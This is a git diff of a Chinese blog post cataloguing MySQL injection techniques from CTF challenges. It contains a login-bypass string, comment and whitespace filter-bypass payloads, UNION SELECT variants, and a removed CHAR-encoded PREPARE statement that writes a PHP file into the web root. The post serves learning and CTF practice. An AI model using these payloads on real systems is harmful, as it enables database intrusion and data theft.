@@ -18,18 +18,18 @@
   
   
   <title>mysql的注入技巧 | ZenisLTZ&#39;s Blog</title>
-  <meta name="description" content="mysql的注入技巧注入方式一下概念并非并列的，只是举出一些常见的叫法  insert/update/delete注入(盲注) md5加密后注入 宽字节注入 报错注入 UDF与攻击存储类似[^1] OOB(带外注入) false注入  Technique写入shell Mysql注入中的outfile、dumpfile、load_file函数详解  secure_file_priv  可以通过命令">
+  <meta name="description" content="mysql的注入技巧注入方式以下概念并非并列的，只是举出一些常见的叫法  insert/update/delete注入(盲注) md5加密后注入 宽字节注入 报错注入 UDF与攻击存储类似[^1] OOB(带外注入) false注入  Technique写入shell Mysql注入中的outfile、dumpfile、load_file函数详解  secure_file_priv  可以通过命令">
 <meta name="keywords" content="mysql">
 <meta property="og:type" content="article">
 <meta property="og:title" content="mysql的注入技巧">
 <meta property="og:url" content="http://ZenisLTZ.github.io/2018/10/21/sqltec_mysql/index.html">
 <meta property="og:site_name" content="ZenisLTZ">
-<meta property="og:description" content="mysql的注入技巧注入方式一下概念并非并列的，只是举出一些常见的叫法  insert/update/delete注入(盲注) md5加密后注入 宽字节注入 报错注入 UDF与攻击存储类似[^1] OOB(带外注入) false注入  Technique写入shell Mysql注入中的outfile、dumpfile、load_file函数详解  secure_file_priv  可以通过命令">
+<meta property="og:description" content="mysql的注入技巧注入方式以下概念并非并列的，只是举出一些常见的叫法  insert/update/delete注入(盲注) md5加密后注入 宽字节注入 报错注入 UDF与攻击存储类似[^1] OOB(带外注入) false注入  Technique写入shell Mysql注入中的outfile、dumpfile、load_file函数详解  secure_file_priv  可以通过命令">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-10-20T18:25:53.733Z">
+<meta property="og:updated_time" content="2018-11-01T07:12:46.184Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="mysql的注入技巧">
-<meta name="twitter:description" content="mysql的注入技巧注入方式一下概念并非并列的，只是举出一些常见的叫法  insert/update/delete注入(盲注) md5加密后注入 宽字节注入 报错注入 UDF与攻击存储类似[^1] OOB(带外注入) false注入  Technique写入shell Mysql注入中的outfile、dumpfile、load_file函数详解  secure_file_priv  可以通过命令">
+<meta name="twitter:description" content="mysql的注入技巧注入方式以下概念并非并列的，只是举出一些常见的叫法  insert/update/delete注入(盲注) md5加密后注入 宽字节注入 报错注入 UDF与攻击存储类似[^1] OOB(带外注入) false注入  Technique写入shell Mysql注入中的outfile、dumpfile、load_file函数详解  secure_file_priv  可以通过命令">
   <!-- Canonical links -->
   <link rel="canonical" href="http://ZenisLTZ.github.io/2018/10/21/sqltec_mysql/index.html">
   
@@ -353,7 +353,7 @@
     </div>
     <div class="article-entry marked-body" itemprop="articleBody">
       
-        <h1 id="mysql的注入技巧"><a href="#mysql的注入技巧" class="headerlink" title="mysql的注入技巧"></a>mysql的注入技巧</h1><h2 id="注入方式"><a href="#注入方式" class="headerlink" title="注入方式"></a>注入方式</h2><p>一下概念并非并列的，只是举出一些常见的叫法</p>
+        <h1 id="mysql的注入技巧"><a href="#mysql的注入技巧" class="headerlink" title="mysql的注入技巧"></a>mysql的注入技巧</h1><h2 id="注入方式"><a href="#注入方式" class="headerlink" title="注入方式"></a>注入方式</h2><p>以下概念并非并列的，只是举出一些常见的叫法</p>
 <ul>
 <li>insert/update/delete注入(盲注)</li>
 <li>md5加密后注入</li>
@@ -395,11 +395,23 @@
 <h4 id="LCTF2017-他们有什么秘密呢"><a href="#LCTF2017-他们有什么秘密呢" class="headerlink" title="LCTF2017 他们有什么秘密呢"></a>LCTF2017 他们有什么秘密呢</h4><p>要获得的数据在第四个</p>
 <p><a href="https://www.cnblogs.com/ur10ser/p/7875473.html" target="_blank" rel="noopener">https://www.cnblogs.com/ur10ser/p/7875473.html</a></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;3 union distinct select 1,2,3,&#123;&#125;  order by 4 desc&quot;</span><br></pre></td></tr></table></figure>
-<h2 id="过滤绕过"><a href="#过滤绕过" class="headerlink" title="过滤绕过"></a>过滤绕过</h2><h3 id="PREPARE语句"><a href="#PREPARE语句" class="headerlink" title="PREPARE语句"></a>PREPARE语句</h3><p>在能连续多次执行的场合(mysqli_multi_query)，可以绕过常见过滤，类似于XSS中的String.fromCharCode()  </p>
+<h3 id="末尾的闭合"><a href="#末尾的闭合" class="headerlink" title="末尾的闭合"></a>末尾的闭合</h3><p>引号的优先级要高于分号，所以闭合时也要有所注意</p>
 <ul>
-<li>SUCTF 2018 MultiSql</li>
+<li><p>引号闭合</p>
+<p>不中断后面语句的执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">万能密码</span><br><span class="line">name=&apos; or &apos;&apos;=&apos;&amp;password=</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>注释符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--&lt;空格&gt;</span><br><span class="line">#     %23</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>%00</p>
+<p>不属于注释符，要加上分号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">... where name = &apos;Boris&apos;;%00&apos;</span><br></pre></td></tr></table></figure>
+</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set @s=concat(CHAR(115),CHAR(101),CHAR(108),CHAR(101),CHAR(99),CHAR(116),CHAR(32),CHAR(39),CHAR(60),CHAR(63),CHAR(112),CHAR(104),CHAR(112),CHAR(32),CHAR(112),CHAR(104),CHAR(112),CHAR(105),CHAR(110),CHAR(102),CHAR(111),CHAR(40),CHAR(41),CHAR(59),CHAR(63),CHAR(62),CHAR(39),CHAR(32),CHAR(105),CHAR(110),CHAR(116),CHAR(111),CHAR(32),CHAR(111),CHAR(117),CHAR(116),CHAR(102),CHAR(105),CHAR(108),CHAR(101),CHAR(32),CHAR(39),CHAR(47),CHAR(118),CHAR(97),CHAR(114),CHAR(47),CHAR(119),CHAR(119),CHAR(119),CHAR(47),CHAR(104),CHAR(116),CHAR(109),CHAR(108),CHAR(47),CHAR(102),CHAR(97),CHAR(118),CHAR(105),CHAR(99),CHAR(111),CHAR(110),CHAR(47),CHAR(49),CHAR(46),CHAR(112),CHAR(104),CHAR(112),CHAR(39),CHAR(59));</span><br><span class="line">PREPARE s2 FROM @s;</span><br><span class="line">EXECUTE s2;</span><br></pre></td></tr></table></figure>
+<h2 id="过滤绕过"><a href="#过滤绕过" class="headerlink" title="过滤绕过"></a>过滤绕过</h2><h3 id="PREPARE语句"><a href="#PREPARE语句" class="headerlink" title="PREPARE语句"></a>PREPARE语句</h3><p>在能连续多次执行的场合(mysqli_multi_query)，用预处理语句来绕过常见过滤</p>
+<p>有点类似于XSS中的String.fromCharCode()  </p>
+<h4 id="SUCTF-2018-MultiSql"><a href="#SUCTF-2018-MultiSql" class="headerlink" title="SUCTF 2018 MultiSql"></a>SUCTF 2018 MultiSql</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set @s=concat(CHAR(115),CHAR(101),CHAR(108),CHAR(101),CHAR(99),CHAR(116),...</span><br><span class="line">PREPARE s2 FROM @s;</span><br><span class="line">EXECUTE s2;</span><br></pre></td></tr></table></figure>
 <h3 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/</span><br></pre></td></tr></table></figure>
 <ul>
 <li>浮点数<br>id=8E0union<br>id=8.0</li>
@@ -410,6 +422,7 @@
 <li>like</li>
 <li>having</li>
 <li>regexp</li>
+<li>between and</li>
 </ul>
 <h4 id="一些匹配类函数"><a href="#一些匹配类函数" class="headerlink" title="一些匹配类函数"></a>一些匹配类函数</h4><p>instr</p>
 <p>locate</p>
@@ -448,10 +461,10 @@
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//，-- , /**/, #, --+, -- -, ;,%00,--a</span><br><span class="line">U/**/ NION /**/ SE/**/ LECT /**/user，pwd from user</span><br><span class="line"></span><br><span class="line">id=-1&apos;UnIoN/**/SeLeCT</span><br><span class="line">id=-1&apos;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</span><br><span class="line">or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。</span><br></pre></td></tr></table></figure>
 <ul>
-<li><p>插入%00</p>
-<p><code>se%00lect</code>%00在mysql中不会被执行</p>
-</li>
-<li><p>插入%</p>
+<li><p>大小写绕过</p>
+<p>当后台mysql配置大小写不敏感时，可以利用</p>
+<p>查看大小写敏感配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &apos;%lower_case%&apos;;</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
 <h3 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h3><ul>
@@ -465,7 +478,7 @@
 </ul>
 </li>
 </ul>
-<h3 id="substr"><a href="#substr" class="headerlink" title="substr"></a>substr</h3><ul>
+<h3 id="substr-等分割函数"><a href="#substr-等分割函数" class="headerlink" title="substr 等分割函数"></a>substr 等分割函数</h3><ul>
 <li>rpadlpad,left,right,mid替代substr </li>
 <li>reverse，insert</li>
 </ul>
